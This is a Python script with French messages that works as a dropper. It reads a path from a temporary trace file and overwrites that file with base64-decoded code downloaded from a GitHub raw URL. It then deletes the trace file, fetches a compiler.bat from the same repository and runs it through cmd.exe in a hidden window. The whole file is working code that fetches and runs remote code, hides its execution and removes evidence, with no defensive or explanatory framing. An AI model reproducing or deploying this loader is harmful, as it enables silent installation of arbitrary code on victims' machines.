import tempfile
import os
import requests
import base64
import subprocess

def modifier_et_supprimer_trace():
    temp_dir = tempfile.gettempdir()  # Chemin temp réel
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.b64"  # base64

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return False

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return False

    try:
        print(f"[...] Téléchargement depuis {raw_url}")
        r = requests.get(raw_url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            contenu_base64 = r.text.strip()
            try:
                contenu_decode = base64.b64decode(contenu_base64).decode("utf-8")
            except Exception as e:
                print(f"[!] Erreur lors du décodage base64 : {e}")
                return False

            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(contenu_decode)
            print(f"[✓] Script mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec du téléchargement. Code HTTP : {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")
        return False

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur lors de la suppression : {e}")

    return True

def telecharger_et_lancer_compilateur():
    temp_dir = tempfile.gettempdir()
    url_bat = "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/compiler.bat"
    chemin_bat = os.path.join(temp_dir, "compiler.bat")

    print(f"[i] Téléchargement du .bat depuis : {url_bat}")
    try:
        r = requests.get(url_bat, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_bat, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(f"[✓] .bat téléchargé dans : {chemin_bat}")
        else:
            print(f"[!] Échec du téléchargement du .bat, code HTTP : {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Erreur pendant téléchargement du .bat : {e}")
        return False

    print("[i] Lancement du .bat en mode invisible...")

    # Lancer en invisible via subprocess et flags Windows
    CREATE_NO_WINDOW = 0x08000000
    try:
        subprocess.run(["cmd.exe", "/c", chemin_bat], creationflags=CREATE_NO_WINDOW, check=True)
        print("[✓] Le .bat a été lancé avec succès.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Erreur lors du lancement du .bat : {e}")
        return False

    # Optionnel : supprimer le .bat après usage
    # os.remove(chemin_bat)
    return True

if __name__ == "__main__":
    print("[*] Début du processus...")

    ok = modifier_et_supprimer_trace()
    if not ok:
        print("[!] Impossible de modifier le script, arrêt.")
    else:
        print("[*] Mise à jour terminée, lancement du compilateur.")
        ok2 = telecharger_et_lancer_compilateur()
        if not ok2:
            print("[!] Échec du lancement du compilateur.")
        else:
            print("[✓] Processus terminé avec succès.")
